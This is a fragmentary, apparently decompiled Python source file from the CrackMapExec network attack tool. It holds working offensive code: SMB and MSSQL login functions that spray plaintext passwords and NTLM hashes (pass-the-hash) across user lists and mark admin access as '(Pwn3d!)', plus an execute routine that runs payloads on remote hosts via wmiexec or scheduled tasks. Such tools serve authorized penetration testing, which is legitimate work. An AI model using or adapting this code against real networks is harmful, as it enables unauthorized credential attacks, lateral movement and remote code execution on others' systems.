...
# Embedded file name: /home/byt3bl33d3r/.virtualenvs/CME_old/lib/python2.7/site-packages/cme/connection.py
# Compiled at: 2016-12-29 02:36:40
...
class Connection:
    ...
    def __init__(self, args, db, host, module, cmeserver):
        ...
        try:
            ...
            self.logger = CMEAdapter(getLogger('CME'), {'host': self.host, 
               'port': self.args.smb_port, 
               'hostname': ('{}').format(self.hostname)})
            self.logger.info(('{} (name:{}) (domain:{})').format(self.server_os, self.hostname.decode('utf-8'), self.domain.decode('utf-8')))
            try:
                smb.logoff()
            except:
                pass
    ...
    def check_if_admin(self):
        if self.args.mssql:
            ...
            try:
                resp = scmr.hROpenSCManagerW(dce, lpMachineName, 'ServicesActive\x00', 983103)
                self.admin_privs = True
    ...
    def plaintext_login(self, domain, username, password):
        ...
        try:
            ...
            out = ('{}\\{}:{} {}').format(domain.decode('utf-8'), username.decode('utf-8'), password.decode('utf-8'), highlight('(Pwn3d!)') if self.admin_privs else '')
            self.logger.success(out)
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error(('{}\\{}:{} {} {}').format(domain.decode('utf-8'), username.decode('utf-8'), password.decode('utf-8'), error, ('({})').format(desc) if self.args.verbose else ''))
    ...
    def hash_login(self, domain, username, ntlm_hash):
        ...
        try:
            if self.args.mssql:
                res = self.conn.login(None, username, '', domain, (lmhash or ':') + nthash if 1 else ntlm_hash, True if self.args.mssql_auth == 'windows' else False)
                if res is not True:
                    self.conn.printReplies()
                    return False
            elif not self.args.mssql:
            ...
            out = ('{}\\{} {} {}').format(domain.decode('utf-8'), username.decode('utf-8'), ntlm_hash, highlight('(Pwn3d!)') if self.admin_privs else '')
            self.logger.success(out)
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error(('{}\\{} {} {} {}').format(domain.decode('utf-8'), username.decode('utf-8'), ntlm_hash, error, ('({})').format(desc) if self.args.verbose else ''))
            if error == 'STATUS_LOGON_FAILURE':
                if username not in user_failed_logins.keys():
                    user_failed_logins[username] = 0
                user_failed_logins[username] += 1
                            ...
                            for ntlm_hash in self.args.hash:
                                if type(ntlm_hash) is not file:
                                    if not self.over_fail_limit(usr.strip()):
                                        if self.hash_login(self.domain, usr.strip(), ntlm_hash):
                                            return
                                elif type(ntlm_hash) is file:
                                    for f_hash in ntlm_hash:
                                        if not self.over_fail_limit(usr.strip()):
                                            if self.hash_login(self.domain, usr.strip(), f_hash.strip()):
                                                return
                        ...
                        with sem:
                            for password in self.args.password:
                                if type(password) is not file:
                                    if not self.over_fail_limit(usr.strip()):
                                        if self.plaintext_login(self.domain, usr.strip(), password):
                                            return
                                elif type(password) is file:
                                    for f_pass in password:
                                        if not self.over_fail_limit(usr.strip()):
                                            if self.plaintext_login(self.domain, usr.strip(), f_pass.strip()):
                                                return
                ...
                if self.args.hash:
                        ...
                        for ntlm_hash in self.args.hash:
                            if type(ntlm_hash) is not file:
                                if not self.over_fail_limit(user):
                                    if self.hash_login(self.domain, user, ntlm_hash):
                                        return
                            elif type(ntlm_hash) is file:
                                for f_hash in ntlm_hash:
                                    if not self.over_fail_limit(user):
                                        if self.hash_login(self.domain, user, f_hash.strip()):
                                            return
                    ...
                    with sem:
                        for password in self.args.password:
                            if type(password) is not file:
                                if not self.over_fail_limit(user):
                                    if self.plaintext_login(self.domain, user, password):
                                        return
                            elif type(password) is file:
                                for f_pass in password:
                                    if not self.over_fail_limit(user):
                                        if self.plaintext_login(self.domain, user, f_pass.strip()):
                                            return
    ...
    def execute(self, payload=None, get_output=False, methods=None):
        ...
        if self.args.mssql:
            ...
            if not methods and not self.args.exec_method:
                ...
                if methods or self.args.exec_method:
                    if not methods:
                        methods = [
                ...
                for method in methods:
                    if method == 'wmiexec':
                        ...
                        try:
                            exec_method = TSCH_EXEC(self.host, self.username, self.password, self.domain, self.hash)
        ...
        output = ('{}').format(exec_method.execute(payload, get_output).strip().decode('utf-8'))
